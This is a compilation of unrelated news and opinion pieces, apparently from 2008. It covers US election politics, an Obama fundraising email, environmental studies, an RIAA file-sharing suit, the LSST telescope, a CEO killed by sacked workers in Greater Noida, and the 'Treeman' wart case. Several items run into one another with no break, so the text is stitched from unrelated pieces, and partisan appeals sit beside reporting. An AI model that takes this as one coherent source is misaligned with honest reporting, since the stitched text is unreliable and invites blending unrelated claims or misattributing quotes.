The Nation has learned that Deripaska told one of his closest associates that he bought the plant " because Putin encouraged him to do it . "
The reason : " the Kremlin wanted an area of influence in the Mediterranean . "
Deripaska is himself involved in some political scandal right now - involving both a high level Labour Party cabinet minister , Lord Peter Mandelson who was one of Tony Blair 's closest advisors and the current shadow chancellor , the Conservative Party 's George Osborne .
Both McCain and his campaign manager , Rick Davis have dubious ties to Deripaska too .
Other McCain campaign advisers , lobbyists to a man , have their own shady connections .
John McCain keeps saying he 's a reformer and a maverick with no time for the incestuous and often shady dealings of the K Street crowd - but his actions speak louder than his words .

On July 27 , 2004 , a friend invited Guru Raj to create a Google e-mail account .
A recent graduate of the University of Virginia , Raj , then twenty - one , was watching the Democratic National Convention on a television in his parents ’ basement , in Norcross , Georgia .
The beta version of Gmail — available by invitation only — was less than four months old at the time , and largely unproved , but Raj’s U.V.A. e-mail account was set to expire in a few weeks , so he decided to give Gmail a try .
At first , Raj tried to create an address using his own name , but , remarkably , both gururaj@gmail.com and rajguru@gmail.com were already taken .
So he tried the name of the young senator from Illinois who was giving the Democratic keynote address on TV .
To his surprise , it worked , and , moments later , barackobama@gmail.com was quietly born .
“ I ’m not some cute little Indian boy who grew up in America with political aspirations , ” Raj , the first in his family to be born an American citizen , said recently .
“ I just thought it would be kind of funny to create an e-mail address based on a random senator whose name no one could spell . ”
Over the next four years , as Gmail became the third most popular Webmail provider in the U.S. and Obama became a serious contender for the next President of the United States , Raj used the account for his personal e-mail .
In the fall of 2006 , he received , for the first time , a message intended for the Senator .
By February , 2007 , when Obama formally announced his candidacy , Raj was daily receiving dozens of misdirected notes from all over the world .
The letters expressed a range of sentiments : simple incredulity ( “ R U REAL ? ” ) , electoral reassurance ( “ Do n’t worry about California , they ’re old fogies anyway ” ) , mystical backing ( “ You represent the spirit of the Lotus sutra ” ) , conspiratorial opposition ( “ Obama might not be a U.S. citizen and not qualified to run for president ” ) , niggling criticism ( “ You were losing your OOMPH delivering your speeches in Texas and Ohio ” ) , sound advice ( “ Do n’t lose your humility ” ) .
Raj ’s favorite e-mail was a nursery rhyme that went , “ Hillery Dillery Dock / Obama will clean her clock / Monica ’s a sin / Bu Ba fell in / Now she ’s gotta deal with Barack . ”
Other correspondents were more practical - minded — one extended an invitation to a Seder in Hyde Park ( “ We heard you were shooting a movie at the synagogue by our place ” ) , while another expressed regrets ( “ I ca n’t make the meeting tomorrow , but I ’d like to buy a shirt — preferably a medium ” ) .
At 11:14 P.M. on May 30th , a real - estate agent from Manhattan sent the following note to barackobama@gmail.com , as well as to barackobama@hotmail.com and barackobama@yahoo.com : “ Mr. Obama , good luck in the rest of the election year .
Please let me know if you have any real estate needs . ”
Raj , who now works for a software consulting company in Washington , D.C. , never replied to these , or to any other e-mails meant for Obama , not even to tell an excited would - be pen pal that he is not , in fact , the Democrats ’ presumptive Presidential nominee .
“ It just became an interesting portal into Americana , ” he said .
“ From the beginning , I had no intention of manipulating anyone . ”
Still , the experiment has recently begun to overwhelm him .
On June 12th , barackobama@gmail.com started receiving much more spam .
Raj suspects that an international political Web site posted his Gmail address , “ because suddenly I was inundated . ”
( He now receives some sixty e-mails a day addressing the Senator , most of them in foreign languages , especially Russian . )
It was becoming impossible for him to separate his own electronic life from Obama ’s , so last fall Raj began using a backup account .
This new Gmail address incorporates his first name , his last name , and — the linchpin — his middle initial .
All of “ Barry ’s messages , ” and those few which Raj himself still gets at barackobama@gmail.com , are diverted to a spam folder in the new account .
“ I check it every once in a while , ” Raj said , “ to see if Obama ’s got any interesting mail . ” ♦

TOLEDO , Ohio -
With John McCain and Barack Obama
already swapping accusations of widespread voter fraud , experts warn
that a bitter and protracted fight could ensue if the race to the White House is decided by a narrow margin .
The legal battle over election rules has already made it all the way to the Supreme Court
as Republicans fight to block potentially false registrations from
being validated and Democrats struggle to prevent voter
disenfranchisement .
Compounding the
problem is the decentralized US electoral system , which hands often
partisan local officials the power to make rules and maintain the voter registration rolls .
" I 'm hoping it 's not close , " said Richard L. Hasen , a professor who specializes in election law at Loyola Law School in Los Angeles .
" I am certain there will be problems on election day . "
An estimated nine million new voters have registered for the hotly
contested November 4 election , and the Obama campaign says Democratic
registrations are outpacing Republican ones by four to one .
The McCain campaign contends that an untold number of those
registration forms are false and warns that illegally cast ballots
could alter the results of the election and undermine the public's
faith in democracy .
Republicans have launched a slew of lawsuits aimed at preventing false
ballots from being cast , the most high - profile an attempt to challenge
as many as 200,000 of more than 600,000 new registrations submitted in
the battleground state of Ohio that was blocked by a Supreme Court ruling Friday .
They point to investigations into whether liberal - leaning community organization ACORN deliberately submitted false voter registrations as proof of " rampant " and widespread fraud which McCain said could be " destroying the fabric of democracy . "
But the Obama campaign said this was just a " smokescreen " to divert
attention from Republican " plotting " to suppress legitimate votes and
to " sow confusion and harass voters and complicate the process for
millions of Americans . "
Voters whose registrations have been challenged or those who find their
names have been removed from the rolls are often required to cast provisional ballots , which are not immediately counted in some jurisdictions and are often rejected due to technicalities .
Meanwhile , a 2007 study by the New York University School of Law
concluded that " it is more likely that an individual will be struck by
lightning than that he will impersonate another voter at the polls . "
" For these problems to be really decisive they have to be within the
margin of litigation , which is typically a few thousand votes , " Hasen
said in a recent interview .

The 2000 election took weeks to resolve as Democrat Al Gore fought Republican George W. Bush all the way to the Supreme Court after Bush won the state of Florida , and thus the election , with a margin of a few hundred votes .
Four years later , Democrat John Kerry conceded defeat despite allegations of widespread voter suppression in Ohio , which handed Bush his second term with a margin of nearly 119,000 votes .
In the meantime , electoral litigation has become part of the standard play book .
The number of lawsuits filed over elections has more than doubled from
an average of 94 in the four years prior to the 2000 election to an
average of 230 in the six years following , Hasen found in a study
published in the Stanford Law Review .
Misinformation has also been used to discourage voters from showing up on election day .
Students in Virginia , Colorado and South Carolina
were wrongfully told by voting officials that they could lose their
scholarships and their parents would no longer be able to claim them on
their income taxes if they registered to vote in their college towns .
The Michigan Department of Civil Rights
launched an advertising campaign this week to combat misleading rumors
- some started by local officials in mailings to voters - that people
would be denied the right to vote if they lost their home to
foreclosure , have a criminal record or do not have photo identification .
Such tactics are not new , said Laughlin McDonald , the director of the American Civil Liberties Union 's voting rights project .
Despite strict constitutional and legal protections for the
right to vote , " the history of the country has been one of flagrant
vote denial , " McDonald told AFP .
Many of tactics once used to keep blacks from voting in the south - poll taxes , literacy tests , violence and intimidation - have been eliminated .
But some have been adapted , including the practice of purging
voting rolls of people likely to vote for the other party by
challenging them en masse .
" There 's more ( attempts at voter suppression ) that 's been going on in the lead - up to this election than any I can remember , " McDonald told AFP .
" The fact remains the people who have the power to make the
rules are all too often willing to do so in ways that serve their
partisan interests . "
The latest mass e-mail from Team Obama cites none other than Karl Rove approvingly — using his comments yesterday that McCain had gone “ too far ” in his attack ads to raise more money for the nutroots .

Going far enough in challenging Barack Obama is not one of them , Mr. Rove .

To :
Make a donation and double your impact Even Karl Rove had to admit yesterday that the McCain campaign ’s lies and negative attacks have gone “ too far . ”
John McCain is running the most negative and dishonest campaign in modern presidential history .
He has demonstrated that he ’d rather lose his integrity than lose this election .
It ’s right out of the Bush - Rove playbook .
Unfortunately , as Karl Rove knows better than anyone , these shameful tactics have worked in the past .
This year , we ca n’t let that happen .
Our goal is to bring 50,000 new donors into our movement by Friday at midnight .
And if you make your first online donation today , your gift will go twice as far .
A previous donor has promised to match every dollar you donate .
Double your impact right now .
Your matched donation of $ 5 will become $ 10 if you donate today .
The culture of corruption and dishonesty that has hurt America so badly the last eight years is playing an even larger role in McCain ’s campaign .
Just this past week , John McCain hired a Washington super - lobbyist to fill positions in a potential McCain - Palin White House .
At least 177 lobbyists have been on McCain ’s campaign staff , and apparently he hopes to run the White House the same way .
Also this week , the McCain campaign continued to repeat a number of outrageous lies , even after watchdogs in the media called them “ shamelessly misleading , ” “ thoroughly dishonest , ” and “ a toxic mix of lies and double - speak . ”
They also lied about the crowd size at one of their rallies — reporting 23,000 attendees when there were only 8,000 .
McCain ’s campaign — run on lobbyists and lies — is no match for this unprecedented grassroots movement .
More than 2,500,000 people have stepped up to own a piece of this campaign .
But if we want change , we must continue to grow this movement and put an end to these dishonorable political tactics .
And we have just 50 days left to do it .
Right now , a previous donor — an ordinary person just like you — has promised to match your donation if you step up today .

Mountain pine beetle infestations have been killing evergreen forests since before I was born .
I have memories of my father pointing out the dead and dying trees to me , saying that those beetles would kill the entire forest if they got the chance , how the warmer winters meant that more eggs and larva survived to eat and kill more trees the next year , that we needed bitterly cold winters to keep the beetles in check .
Unfortunately , there have been too many warm winters in a row , and pine beetle has spread to the point that entire swaths of forest are dead or dying , not just isolated trees or stands of trees .
We ’re at the point that the Colorado town of Frisco held its first annual BeetleFest , with expectations of an unfortunately long run of festivals in the future .
Now a new release from the National Science Foundation suggests that the dying forests will change more than just the trees themselves .
According to the article , scientists from the National Center for Atmospheric Research ( NCAR ) believe that the pine beetle may be responsible for changes in Rocky Mountain climate and air quality .
This summer saw the start of a four - year study into how much the pine beetle - killed forests are changing cloud formation , aerosols ( particles such as soot ) , and volatile organic compounds ( VOCs ) in the air .
The region under study extends from southern Wyoming down to New Mexico .
Scientists expect that they ’ll find increased amounts of VOCs in the air , higher amounts of aerosols , and reduced water vapor and cloud formation , and thus lower precipitation near beetle infested forests as compared to healthy forests .
The scientists quoted in the release believe that trees under attack release VOCs and aerosols in the process of trying to fight off the beetle and the fungus that follows ( and is ultimately responsible for killing the trees )
In addition , respiration in a healthy forest releases groundwater from the tree ’s roots into the air , aiding in cloud formation and raising humidity .
An infested forest would have fewer live trees to perform this ecological function , and so weather patterns would be affected in the process .
It ’s fact that warm winters have enabled the spread of the mountain pine beetle throughout the Rocky Mountains .
Whether the pine beetle could become a disruption mechanism in the climate throughout the mountain region remains to be seen .

New study says forest destruction costs trillions annually
A new EU study headed by Deutsche Bank economist Pavan Sukhdev has concluded that destruction of forest internationally is causing economic damage to the tune of $ 2 – $ 5 trillion , or up to 7 % of the global economy , annually .
That ’s roughly three to seven times the amount of the U.S. financial bailout every year .
This calculation was done by placing value on the various “ services ” that healthy , existent forests provide for free , such as carbon sequestration , water treatment , food , and water storage .
Further , Sukhdev concluded that the costs were essentially regressive , since the poor rely more on natural forests for their livelihoods globally than do the wealthy .
According to the BBC article , environmental groups are hoping that The Economics of Ecosystems and Biodiversity ( Teeb ) study will bring the value of natural systems to the forefront of people ’s minds in much the same way that the Stern Review did two years ago .
And while it ’s unfortunate that the intrinsic value of natural spaces has not been internalized by enough people worldwide , an economic argument for the value of those same natural spaces may have a better chance of grabbing the attention of economy - obsessed businessmen and politicians .

Global heating will affect tropical species too
Many scientists and laypeople have assumed that the tropics would be relatively immune to the effects of global heating .
After all , the tropics are hot already , and presumably the plant and animal species residing in the tropics have an inherent resistance to warmer temperatures .
A new study by University of Connecticut professor and ecologist Robert Colwell and reported in the UConn Advance indicates that this may not , in fact , be as true as people had been assuming .
According to the Advance story , much of the tropics is roughly the same temperatures , so it ’s only on the fringes – where the tropics meet temperate zones – that plants and animals have the opportunity to move to cooler latitudes ( away from the equator ) .
Everywhere else in the tropics species must change their elevation by climbing mountains , hillsides , etc .
Colwell has found that this may not be possible for all species for several reasons .
The first is that the species on the top has no - where to go , so they must simultaneously compete with invaders from lower down in altitude and adapt to hotter temperatures , something that not all species will be able to do .
The second is that human ’s have clear cut many mountains and hillsides for forestry products or agriculture , preventing the movement of many species up in altitude .
In addition , as the lowlands heat up , and as species attempt to move up in elevation , they effectively abandon ecological niches in the lowlands , reducing biodiversity throughout the tropics in the process .
This is especially true of species that cannot migrate to higher altitudes for various reasons and that cannot adapt to higher temperatures .
The conclusion of Colwell ’s 15 years of research , as reported by the Advance , is this : the tropics are n’t immune to the effects of global heating any more than the world ’s temperate zones or arctic regions are .

Adapting supply chain management to high fuel prices
The Financial Times ( FT ) of London had a story last week about how companies will have to adapt their supply chains and inventory management methods to adapt to high oil prices .
Fundamentally it ’s a problem of economics – just - in - time and lean manufacturing techniques rely on cheap fuel to make transportation cheaper than inventory storage .
Similarly , manufacturing off - shore becomes less economically viable when shipping goods from those countries is more expensive .
And nearly all existing supply chain management schemes were designed before accounting for the costs of carbon emissions became important due to present or anticipated carbon limits or taxes .
According to the article , there are a number of ways that costs and carbon emissions can be reduced .
Shifting from fast air and truck transportation to slow rail and ship helps , as does sharing delivery vehicles and even warehousing facilities when possible .
However , the FT article points out that these changes take a great deal of planning and organizing , especially when different companies use different supply chain management systems .
However , if companies can get past such cultural differences to work together , the cost savings , and energy and carbon savings , are significant .
After all , every truck you can run full of food or other products both to and from a warehouse nearly doubles efficiency .

Wind jobs helping employment in depressed areas
The upper Midwest and parts of the Midwest and South have serious problems with employment .
These areas are some of the worst off in the nation , especially those areas that have come to rely on the Big 3 automakers .
But according to a recent post in the NYTimes Green , Inc. blog , there ’s a good chance that new wind turbine construction jobs will create new jobs throughout “ the wind belt ” .
According to the post , four new plants have opened recently .
Nine plants were announced last year , and all the manufacturing plants currently in the U.S. are expected to manufacture 50 % of all wind components in the U.S. by the end of the year , up from 30 % in 2005 .
The advantages of this are pretty clear .
When it comes to turbine blades , for example , they ’re so large that they ’re expensive to transport , so it ’s cheaper to manufacture them close to where they ’ll ultimately be used .
And the post also suggests that wind turbine companies are starting to build plants in the U.S. because the dollar has fallen enough against other currencies that it ’s cheaper to manufacture in the U.S. than it is offshore ( when transportation is factored in ) .
However , green wind jobs ca n’t do it alone .
The post points out that GM alone has cut 19,000 jobs since early 2007 , while all the new wind manufacturing jobs have created only a quarter of that .

McCain rallies start in referring to Obama as Barack Hussein Obama .
Late Update :
We ’re here at TPM World HQ listening to McCain spokesman Tucker Bounds be interviewed by Andrea Mitchell .
And the subtext of even Mitchell ’s questions seem to be that McCain is pretty much wall - to - wall sleaze at this point .
One interesting thing to consider is that we may be on the verge of seeing McCain not only lose the presidency but his entire reputation as well .
He ’ll lose everything but the houses and the fancy lifestyle .
Joe Klein has a run-down on all McCain ’s latest sleaze .
SAN FRANCISCO ( MarketWatch ) --
Gas prices may be falling fast from record highs , but travelers are avoiding the highways and jumping on buses and trains at a record pace , according to a report from the U.S. Department of Transportation on Friday .
“ " Relying on the gas tax is like relying on cardboard to keep the rain out - the longer you use it the less it works . " ”
In fact , Americans drove 15 billion fewer miles in August than they did in the same month a year ago , according to federal data , which puts the streak of declining driving habits at 10 months .
That represents a 5.6 % decline from August 2007 , marking the biggest year - over - year drop ever recorded , U.S. Secretary of Transportation Mary Peters said in a statement .
At the same time , public transit ridership jumped 6.2 % across the country this summer compared with a year ago .
Peters pointed out that Texas , where she spoke during a visit to a light - rail station under construction in Dallas , saw an increase of 15 % in its DART rail system .
Gas began its swift descent from record highs in mid-July and currently costs a national average $ 2.78 for a gallon of regular unleaded , according to recent numbers from AAA .
That 's down almost a dollar from a month ago and is more or less the same as it cost in October 2007 .
The trend , likely exacerbated by the dismal state of the economy , is making it difficult for the government to pick up the tab .
Peters warned that the lower income from gas taxes will make it difficult for the federal agency to continue to fund future projects .
" We pay for transit the same way we pay for road and bridge projects -- with federal gas taxes , " she said .
" Relying on the gas tax is like relying on cardboard to keep the rain out -- the longer you use it the less it works . "
The recording industry wants $ 7,400 from Whitney Harper for infringing 37 songs on the Kazaa file sharing network .
Harper , shown here at age 14 , was a juvenile at the time of the unlawful downloading .
She is now a college junior fighting the case .
Former cheerleader Whitney Harper admits downloading pirated music from her San Antonio , Texas family 's computer years ago , when she was barely in high school .
She just does n't think think she should pay $ 7,400 for it today .
" I would do homework on that computer and listen to music .
I did n't know I was stealing or distributing it .
I thought I was like listening to MTV on the internet , " Harper said in a telephone interview .
Harper is now 20 , a Texas Tech public relations junior , and represents yet another statistic in the Recording Industry Association of America 's litigation campaign – with some 30,000 copyright file sharing lawsuits filed and counting .
It 's not known how many of the RIAA targets are juveniles , but Harper is being pursued for acts she says she committed when she was 14 , 15 , or 16 years of age .
Now the Recording Industry Association of America wants ( .pdf ) $ 7,400 to settle a file sharing lawsuit stemming from her piracy of 37 tracks , including music by Eminem , the Police , Mariah
Carey and others .
" I had no idea I was doing anything wrong .
I knew I was listening to music .
I did n't have an understanding of file sharing , " Harper said .
For years , those tracks languished on the family 's computer with the file share folder open , even after Harper moved to college two years ago .
" I do n't even remember what the password is , " she said of her Kazaa account .
" I think it is morally wrong to sue me for something I did that long ago .
That it was being distributed to all of cyberspace , I did n't have an understanding of that at all . "
Harper , who says file sharing is " morally wrong , " is now a junior at Texas Tech .
Last year , the RIAA originally sued her father , Steven , but redirected its case months later to his daughter after she admitted she was the downloader .
" They contacted my dad , who does n't know much about computers except for e-mail , " she said .
" He said he did n't know what they were talking about . "
RIAA spokeswoman Cara Duckworth said via an e-mail : " As in every case , we strive to be fair and reasonable .
However , it 's disappointing that the defendant is apparently choosing to drag this out . "
The woman 's lawyer , Scott Mackenzie of Dallas , said RIAA lawyers told him , " ' Come on , she knew better than this , ' " he said .
For her part , Harper said downloading " is morally wrong for people that know what they are doing .
I would not do it now .
I would never do it .
I do n't steal from people .
I 'm not a bad person . "
She is demanding a trial , and the RIAA in court documents last week called her " vexatious " for refusing to settle for $ 200 a song , the amount the Copyright Act allows for so - called " innocent infringement . "
" I think it is wrong for them to sue me .
I 'm hoping I can win and do n't have to pay anything , " she said .
While most of the RIAA file sharing cases settle out of court for a few thousand dollars , one lawsuit has gone to trial .
It resulted in a $ 222,000 verdict against a Minnesota woman last year for infringing 24 songs on Kazaa .
But a mistrial was declared last month after the trial judge ruled that merely making available songs on the internet for others to download does not amount to copyright infringement , a decision the RIAA is appealing .
Interview
It makes for one heck of a project mission statement .
Explore the nature of dark matter , chart the Solar System in exhaustive detail , discover and analyze rare objects such as neutron stars and black hole binaries , and map out the structure of the Galaxy .
The Large Synoptic Survey Telescope ( LSST ) is , in the words of Jeff Kantor , LSST data management project manager , " a proposed ground - based 6.7 meter effective diameter ( 8.4 meter primary mirror ) , 10 square - degree - field telescope that will provide digital imaging of faint astronomical objects across the entire sky , night after night . "
Phew .
When it 's fully operational in 2016 , the LSST will : " Open a movie - like window on objects that change or move on rapid timescales : exploding supernovae , potentially hazardous near - Earth asteroids , and distant Kuiper Belt Objects .
" The superb images from the LSST will also be used to trace billions of remote galaxies and measure the distortions in their shapes produced by lumps of Dark Matter , providing multiple tests of the mysterious Dark Energy . "
In its planned 10 - year run , the LSST will capture , process and store more than 30 Terabytes ( TB ) of image data each night , yielding a 150 Petabytes ( PB ) database .
Talking to The Reg , Kantor called this the largest non-proprietary dataset in the world .
Data management is one of the most challenging aspects of the LSST .
Every pair of 6.4GB images must be processed within 60 seconds in order to provide astronomical transient alerts to the community .
In order to do this , the Data Management System is composed of a number of key elements .
These are :
the Mountain / Base facility , which does initial data reduction and alert generation on a 25 TFLOPS Linux cluster with 60 PB of storage ( in year 10 of the survey )
a 2.5 Gbps network that transfers the data from Chile ( where the telescope itself will be based ) to the U.S. and within the US
the Archive Center , which re-reduces the data and produces annual data releases on a 250 TFLOPS Linux cluster and 60 PB of storage ( in year 10 of the survey )
the Data Access Centers which provide access to all of the data products as well as 45 TFLOPS and 12 Petabytes of end user available computing and storage .
So what 's a time - critical system of this magnitude written in ?
The data reduction pipelines are developed in C++ and Python .
They rely on approximately 30 off - the - shelf middleware packages / libraries for parallel processing , data persistence and retrieval , data transfer , visualization , operations management and control , and security .
The current design is based on MySQL layered on a parallel , fault - tolerant file system .
GREATER NOIDA :
In one of the worst instances of industrial violence in recent times , the MD - cum - CEO of the India unit of Italian MNC , Graziano Trasmissioni , was bludgeoned to death by a 200 - strong armed mob of dismissed workers which had barged into the company premises and indulged in largescale violence .
( Watch )
According to Graziano employees , the sacked workers rushed into the premises around 12.20 pm when the gates were opened to let in a car .
" They smashed each one of the approximately 20 cars inside the compound .
Hearing the commotion , our CEO , Lalit Kishore Chaudhary , came out to the building entrance .
He was abused while trying to reason with the protesters .
And , when he objected , the beat him to death with a hammer , " said production supervisor , Udaivir .
( Watch )
Chaudhary , 44 , was rushed to Greater Noida 's Kailash Hospital , where doctors declared him brought dead .
The violence left at least 50 executives and workers of the unit injured .
Of the 44 staffers taken to hospital , 34 of them were yet to be discharged until Monday night .
Of these , 10 executives of the company remained in the intensive care unit .
The unit also sustained heavy damage in the vandalism that followed .
Five Italian technical consultants , who were visiting the unit , barely managed to escape injuries .
Some of them had to plead with the raiders to spare them .
The unit , a 100 % subsidiary of Graziano Italy , specializes in making gears and transmission systems for vehicles .
It was set up in 1998 and commenced commercial production in 2000 .
Shockingly , despite several Graziano officials phoning up a number of Noida police officials about the violence , only two police constables arrived at the spot after an hour .
And , even at 3.30 pm , as the unit 's security personnel and some other employees shut themselves up in the unit , only about half a dozen Provincial Armed Constabulary personnel were posted outside .
And , there was no officer with them .
Which meant that , in case of an emergency , there was nobody there to order any action .
And , this was the state of affairs with the district reserve police lines being located half a kilometre away .
Police officers were not available for comment , until 9.45 pm , when area superintendent of police , Babu Ram , claimed , " We had sent force within 15 minutes of getting information .
Later , we also arrested 63 persons for murder , rioting and other charges .
We had even earlier received a note from the Italian Embassy about trouble at Graziano . "
The roots of the unrest can be traced to three months ago , when the company declared a partial lockout .
Some 200 employees were affected .
Company sources said 15 staffers were given termination letters while the others were to be taken back .
According to a company employee , " Some workers had been locked out selectively .
They had arrived today to negotiate the re-employment terms .
But , they were not willing to accept some conditions .
And , sat on a dharna outside the main gate .
There is a court injunction against these workers coming within 300 meters of the unit .
But the police did not arrive when about 200 of them were at the gates , even as a precautionary measure . "
The bloodstained hammer , which was allegedly used to kill Chaudhary , was found lying in the premises , and had surprisingly not been seized by the police as evidence .
In the company guesthouse , visiting Italian technical consultant , Forettii Gatii , told TOI , " I just locked my room 's door from inside .
And I prayed they would not break in .
See , my hands are trembling even three hours later . "
Another consultant said they broke the door of his room and entered , but he just pleaded to them to spare him .
For some reason , he was spared .
But inside the unit , in spite of there being over 30 security guards , the remaining employees looked scared and worried .
Chaudhary is survived by wife Ratna , a lecturer at DU 's Kirori Mal College .
His only son , Keshav , studies in Class XII at Modern School , Barakhamba Road .
According to family circles , he will be cremated at Delhi's Nigambodh Ghat on Tuesday morning .
WASHINGTON 
Two weeks ago , senior Bush administration officials gathered in secret with Afghanistan experts from NATO and the United Nations at an exclusive Washington club a few blocks from the White House .
The group was there to deliver a grim message : the situation in Afghanistan is getting worse .
Their audience : advisers from the presidential campaigns of John McCain and Barack Obama .
Over two days , according to participants in the discussions , the experts laid bare Afghanistan ’s most pressing issues .
They sought to make clear that the next president needed to have a plan for Afghanistan before he took office on Jan. 20 .
Otherwise , they said , it could be too late .
With American casualties on the rise and Taliban militias gaining new strength , experts on Afghanistan say the next president will need to decide swiftly if he intends to send more troops there , because even after deployment orders are issued , it could take weeks or months for American forces to arrive .
The next president will also face what could be politically fraught decisions about how aggressively to pursue a campaign against militants taking shelter in Pakistan ’s tribal areas and whether to embrace negotiations under way in Afghanistan aimed at getting elements of the Taliban to lay down their arms .
The discussions were started earlier this month in Saudi Arabia , and talks among Afghan officials and Taliban representatives have continued in Kabul at the request of President Hamid Karzai of Afghanistan .
( CNN ) --
For 20 years , the warts studding Dede Kosawa 's hands and feet multiplied and sprouted like gnarled roots .
Doctors believe Dede Kosawa 's unusual appearance occurred because of a immune defect and HPV .
His hands looked like contorted , yellow - brown branches extending 3 feet .
Unable to clamp his hands into a fist or pick up a fork , he made his living by performing in carnivals in rural Indonesia .
He became known as the Treeman .
" His life was taken away from him , " said Dr. Anthony Gaspari , an American dermatologist who traveled twice to Indonesia to treat Kosawa .
" He was severely disfigured and was sent into a rural isolated village where he was sheltered from his peers .
With good reason , he was a sad man .
He wanted to be cured and he wanted hope . "
The growths encrusting his arms accounted for nearly 12 pounds of his 100 - pound body .
Kosawa , 36 , often became exhausted after taking a few steps because of the dense warts on his feet .
The growths that carpeted his limbs were posing more problems .
" He was getting infected , " said Gaspari , chief of dermatology at the University of Maryland Medical Center in Baltimore , Maryland .
" He had insects living in the base of the wood - like material . "
Doctors believe that Kosawa 's case was a perfect storm , created by a genetically inherited immune defect and a type of human papillomavirus , or HPV .
Kosawa told doctors that the warts started appearing after getting a cut in his skin as a teenager .
There are hundreds of types of HPV , some of which are linked to cervical cancer and others that cause common warts that can be acquired through cuts .
" The HPV - 2 virus that causes common warts is the same exact wart virus that he 's infected with , except it was growing out of control , " Gaspari said .
Kosawa has a deficiency of white blood cells , which are crucial in fighting infections , and his weakened immune system could n't fight the HPV .
The virus hijacked his skin cells , causing it to produce massive amounts of keratin , a protein found in hair and fingernails .
The warts sprouted into dense growths known medically as " cutaneous horns " on his hands and feet .
" I had never seen anything this severe , " said Gaspari , a dermatologist for 25 years .
" I shared this case with my colleagues , and no one had ever seen this before . "
He became involved in Kosawa 's case after being approached by a dermatology journal and Discovery Health Channel .
His travels to Indonesia are chronicled in the channel 's documentaries and the second chapter , " Treeman : Search for the Cure , " which premieres Sunday on Discovery Health .
Earlier in his life , Kosawa sought help from local doctors , who followed the prescribed treatment by removing the warts .
" It grew back after the operation , " he says in the documentary .
" It grew back faster . "
The skin treatments did n't work , because they did n't address his weakened immune system , and Kosawa could not afford more medical procedures , Gaspari said .
" Here 's a man with chronic immune defect that had bad wart virus that went untreated for 20 years , " he said .
" In an industrialized country , this individual would have come to the attention of the health care system and would have interventions that would prevent it from progressing .
That 's the reason why it developed into an extremely bizarre , unusual appearance . "
As Kosawa aged , his condition worsened .
The horns clustered on his limbs , where the body temperature is lower .
They grew at a rate of 5 millimeters a month .
Warts that looked like barnacles began to clump around his eyes and nose .
" I am afraid that it will cover all my face , " Kosawa told an Indonesian journalist .
" I wo n't be able to see .
I wo n't be able to eat . "
The growing of the warts was not painful , Gaspari said .
But the cutaneous horns were attached to the skin , and Kosawa would feel pain if they were pulled or entangled .
As the growths took over his hands and feet , Kosawa lost his independence , and his wife left him .
He had worked in construction and fishing but could not longer work .

MayoClinic.com : Common warts MayoClinic.com : Plantar warts
Kosawa 's siblings and parents cared for him , feeding and cleaning him .
His condition is not contagious , and his family members have not been infected with similar skin growths .
" He has a wonderful family , " Gaspari said .
" That 's why he was able to survive as long as he did . "
To support his two teenage children , Kosawa joined a traveling performance group with people who have various skin deformities .
" I try to be a good father , but I can't give them what they need , " he said in the documentary .
" I feel sad , because I cannot touch them . "
Similar cases of uncontrollable wart growths have been reported in China and Romania .
In 2007 , Chinese researchers reported two unrelated male patients who developed cutaneous horns on their limbs .
Both patients had the same type of HPV infections , according to studies .
In 2007 , as word spread about Kosawa 's condition , he was brought into an Indonesian hospital for treatment .
About 12 pounds of cutaneous horns were sawed from his hands and feet .
Skin grafts were taken from his back and buttocks and placed on his forearm .
Gaspari often disagreed with the Indonesian doctors ' procedures such the skin grafts , saying it was invasive and could be infected with the virus .
After several surgeries , Kosawa has been able to walk , lift a fork and write .
He was discharged from the hospital in early September .
The warts have been reappearing , but Kosawa is receiving chemotherapy to stop the virus .
Gaspari continues to monitor Kosawa 's progress through e-mails and teleconference calls with Indonesian doctors .
" You can see the outlines of his hands , " Gaspari said .
" It 's still covered in warts .
Before , you could n't tell the top from the bottom .
He has definitely made progress and gained some weight . "
The experts are waiting to learn more about Kosawa 's reaction to the medical treatments , Gaspari said .
" The story has not fully unfolded yet . "

DEMOCRATS MAKE GAINS DEMOCRATS MAKE GAINS
Democrats have made gains over Republicans since 2004 in most battleground states that register voters by party affiliation : State Democrats Republicans Colorado +13,000 - 90,000 Florida +130,000 - 1,000 Iowa +80,000 - 23,000 Nevada +59,000 - 25,000 New Hampshire +35,000 - 1,000 New Mexico +12,000 +1,000 North Carolina +137,000 +50,000 Pennsylvania +372,000 -198,000 Source : Secretaries of state FAIRFAX , Va. 
A record - breaking season for voter registration drives ends Monday in nearly half the nation 's states , closing the books on a process that has helped Democrats and hurt Republicans in many states crucial to the fortunes of Barack Obama and John McCain .
Democrats have added more than 800,000 voters and Republicans have lost 300,000 in eight of the most tightly fought states in the presidential race : Florida , Pennsylvania , North Carolina , Colorado , Iowa , Nevada , New Mexico and New Hampshire .
Changes occur when voters switch parties or are removed from registration lists because they moved , died or have n't voted in recent elections .
YOUTH MOVEMENT : Signs of electorate shift Some battlegrounds , such as Ohio , Virginia , Missouri , Minnesota and Wisconsin , do not register voters by party .
Most have seen registration increases over 2004 as officials prepare for what could be record turnout Nov. 4 . UNDECIDED VOTER ?
Join our debate panel Doug Lewis , executive director of the Election Center , which represents state and county election offices , expects an all - time high , surpassing the 177 million registered in 2004 .
" It 's going to be a tsunami of voters , " he said .
Stacks of applications have been arriving daily at the Office of Elections in Fairfax , Va. , the largest county in one of the most closely watched states this year .
" The staff is just trying to process them as fast as we can , " county registrar Rokey Suleman said .
Much of the work signing up new voters has been done by Democrat Obama 's campaign , as well as the political parties .
In Pennsylvania , Democratic registration is up 400,000 from 2004 ; Republicans have lost 200,000 .
Jon Carson , Obama 's national field director , says the latest data does n't capture a " massive spike " in registrations last week .
Lines could form when registration closes Monday in 18 states and the District of Columbia .
Some states have later deadlines ; 10 allow Election Day registration .
On Monday , two organizations that seek to register young , minority and low - income Americans — Project Vote and the Association of Community Organizations for Reform Now ( ACORN ) — will announce that they helped 1.3 million people register or update their information this year .
More than half of them are in Ohio , Michigan , Florida and Pennsylvania , 60 % are under 30 and about two - thirds are minorities , said Michael Slater , executive director of Project Vote .
Carmen Arias of ACORN said the faltering economy motivates them .
GOP officials admit Democrats did a better job registering voters , but they say Republicans are better at getting voters to the polls , which could help McCain .
" These are n't normally people who vote in school board elections , " said Rich Beeson , political director for the Republican National Committee .
" These are people who need a lot of motivation . "

Report Copyright Violation Homeland Security Deptarment Detects Terrorist Threats by Reading your Mind
Most preventive screening looks for explosives or metals that pose a threat .
But a new system called MALINTENT turns the old school approach on its head .
This Orwellian - sounding machine detects the person — not the device — set to wreak havoc and terror .
